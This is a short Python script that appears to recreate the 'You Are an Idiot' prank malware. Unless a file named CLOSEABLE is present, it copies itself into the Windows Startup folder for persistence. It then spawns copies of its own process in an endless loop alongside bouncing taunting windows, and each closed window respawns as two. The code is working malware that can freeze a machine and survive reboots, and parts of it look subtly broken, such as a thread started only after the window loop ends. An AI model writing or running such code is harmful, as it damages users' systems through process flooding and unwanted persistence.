import os
import sys
import time
import threading
import subprocess
import tkinter as tk
import random
import shutil

sf = False

if "CLOSEABLE" in os.listdir("."):
    sf = True
if not sf:
    shutil.copy(__file__, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

def spawn_window():
    win = tk.Tk()
    win.title("You Are an Idiot!")
    win.geometry("200x100+{}+{}".format(random.randint(0, 800), random.randint(0, 600)))
    label = tk.Label(win, text="You Are an Idiot!", font=("Arial", 14), fg="red")
    label.pack(expand=True)
    def bounce():
        dx, dy = 5, 5
        x, y = random.randint(0, 800), random.randint(0, 600)
        while True:
            try:
                win.geometry(f"+{x}+{y}")
                x += dx
                y += dy
                if x <= 0 or x >= 1000: dx = -dx
                if y <= 0 or y >= 700: dy = -dy
                time.sleep(0.03)
            except:
                break
    def on_close():
        for _ in range(2):
            threading.Thread(target=spawn_window).start()
        win.destroy()
    if not sf:
        win.protocol("WM_DELETE_WINDOW", on_close)
    win.mainloop()
    threading.Thread(target=bounce, daemon=True).start()

children = []
while not sf:
    proc = subprocess.Popen([sys.executable, __file__, "child"])
    threading.Thread(target=spawn_window).start()
    children.append(proc)
    time.sleep(1)
if sf :
    threading.Thread(target=spawn_window).start()